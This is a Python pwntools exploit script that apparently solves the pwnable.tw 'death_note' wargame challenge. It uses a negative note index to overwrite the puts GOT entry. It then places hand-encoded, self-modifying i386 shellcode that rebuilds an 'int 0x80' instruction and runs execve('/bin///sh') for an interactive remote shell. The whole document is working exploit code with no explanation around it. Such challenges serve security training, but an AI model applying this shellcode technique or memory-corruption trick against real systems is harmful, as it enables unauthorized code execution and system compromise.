from pwn import *

context(terminal = ['deepin-terminal','-x','sh','-c'],log_level = 'debug',arch = 'i386',os = 'linux')


debug = 0
ElfPath = './death_note'
LibcPath = ''
RemoteAddr = 'chall.pwnable.tw'
RemotePort = '10201'

elf = ELF(ElfPath)
if debug:
    sh = process(ElfPath)
    libc = elf.libc
else:
    sh = remote(RemoteAddr,RemotePort)
    if LibcPath:
       libc = ELF(LibcPath)

def add_note(index,name):
    sh.sendlineafter('choice :','1')
    sh.sendlineafter('Index :',str(index))
    pause()
    sh.sendlineafter('Name :',name)

offset = ( elf.symbols['note'] - elf.got['puts']) >> 2
shellcode = '''
    /* execve(path='/bin///sh', argv=0, envp=0) */
    /* push '/bin///sh\x00' */
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    push esp
    pop ebx
   /*rewrite shellcode to get 'int 80'*/
    push edx
    pop eax
    push 0x60606060
    pop edx
    sub byte ptr[eax + 0x35] , dl
    sub byte ptr[eax + 0x35] , dl
    sub byte ptr[eax + 0x34] , dl
    push 0x3e3e3e3e
    pop edx
    sub byte ptr[eax + 0x34] , dl
    /*set zero to edx*/
    push ecx
    pop edx
   /*set 0x0b to eax*/
    push edx
    pop eax
    xor al, 0x40
    xor al, 0x4b    
  /*foo order,for holding the  place*/
    push edx
    pop edx
    push edx
    pop edx
'''
shellcode = asm(shellcode) + '\x6b\x40'
add_note(-1 * offset,shellcode)

sh.interactive()
sh.close()


